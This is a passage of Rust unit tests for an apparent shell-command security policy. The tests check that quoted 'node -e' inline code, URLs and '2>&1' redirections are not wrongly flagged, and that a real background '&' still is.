        assert_eq!(tokens, vec!["node", "-e", "\"import os; print('hi')\""]);
    }

    #[test]
    fn node_inline_code_paths_not_flagged() {
        let mut p = default_policy();
        p.allowed_commands.push("node".into());
        p.block_high_risk_commands = false;

        let cmd = "node -e \"const x = '//comment'; fetch('https://example.com')\"";
        assert!(
            p.forbidden_path_argument(cmd).is_none(),
            "paths inside quoted inline code should not be flagged"
        );
    }

    #[test]
    fn fd_redirect_ampersand_not_treated_as_background() {
        let _p = default_policy();
        // 2>&1 is stderr-to-stdout redirection, not a background operator
        assert!(
            !contains_unquoted_single_ampersand("echo hello 2>&1"),
            "2>&1 should not be detected as a background operator"
        );
        // But actual background & should still be caught
        assert!(contains_unquoted_single_ampersand("sleep 10 &"));
        // && is allowed (logical AND)
        assert!(!contains_unquoted_single_ampersand("ls && echo done"));
    }

    #[test]
    fn node_inline_code_allowed_when_node_in_allowlist() {
        let mut p = default_policy();
        p.allowed_commands.push("node".into());
        p.block_high_risk_commands = false;

        let cmd = "node -e \"console.log('hello world')\"";
        assert!(
            p.is_command_allowed(cmd),
            "node -e with quoted inline code should be allowed"
        );
    }

    #[test]
    fn node_e_multiline_inline_code_not_blocked() {
        let mut p = default_policy();
        p.allowed_commands.push("node".into());
        p.block_high_risk_commands = false;

        // Reproduces the exact error from the logs: node -e with multiline
        // JS containing URLs and // comments that was blocked with
        // "Path blocked by security policy: //"
        let cmd = concat!(
            "node -e \"\n",
            "const Parser = require('rss-parser');\n",
            "const SOURCES = {\n",
            "  'BBC': 'http://feeds.bbci.co.uk/news/world/rss.xml'\n",
            "};\n",
            "async function run() {\n",
            "  // fetch feeds\n",
            "  console.log('done');\n",
            "}\n",
            "run();\n",
            "\" 2>&1",
        );
        assert!(
            p.is_command_allowed(cmd),
            "node -e with multiline inline JS should be allowed"
        );
        assert!(
            p.forbidden_path_argument(cmd).is_none(),
            "// comments and URLs inside node -e code should not be flagged as paths"
        );
    }
}
